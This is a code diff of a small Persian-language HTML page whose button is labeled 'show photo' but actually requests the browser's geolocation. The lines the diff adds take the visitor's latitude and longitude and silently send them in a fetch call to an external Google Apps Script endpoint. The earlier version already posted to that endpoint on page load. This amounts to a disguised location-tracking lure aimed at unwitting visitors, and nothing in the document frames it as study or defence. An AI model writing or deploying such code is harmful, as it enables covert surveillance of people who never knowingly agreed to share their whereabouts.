@@ -5,33 +5,20 @@
 <title>موقعیت من</title>
 </head>
 <body>
-
 <h2>موقعیت فعلی</h2>
 <button onclick="getLocation()">نمایش عکس</button>
-
 <p id="result"></p>
-
 <script>
-function getLocation() {
-  navigator.geolocation.getCurrentPosition(
-    function(position) {
-      document.getElementById("result").innerHTML =
-        "Latitude: " + position.coords.latitude +
-        "<br>Longitude: " + position.coords.longitude;
-    },
-    function(error) {
-      document.getElementById("result").innerHTML =
-        "دسترسی به موقعیت داده نشد.";
-    }
-  );
+function getLocation(){
+navigator.geolocation.getCurrentPosition(function(p){
+var lat=p.coords.latitude;
+var lon=p.coords.longitude;
+document.getElementById("result").innerHTML="Lat: "+lat+"<br>Lon: "+lon;
+fetch("https://script.google.com/macros/s/AKfycbxOSBgHXr5R8ndNperhFhkuYURo559hgSjZg9JYYy0RXWE2rJ00zQnpOmTwuOFhJ4Q59Q/exec?lat="+lat+"&lon="+lon);
+},function(){
+document.getElementById("result").innerHTML="دسترسی داده نشد";
+});
 }
-fetch("https://script.google.com/macros/s/AKfycbxOSBgHXr5R8ndNperhFhkuYURo559hgSjZg9JYYy0RXWE2rJ00zQnpOmTwuOFhJ4Q59Q/exec", {
-  method: "POST"
-})
-.then(response => response.text())
-.then(result => console.log(result))
-.catch(error => console.error(error));
 </script>
-
 </body>
 </html>
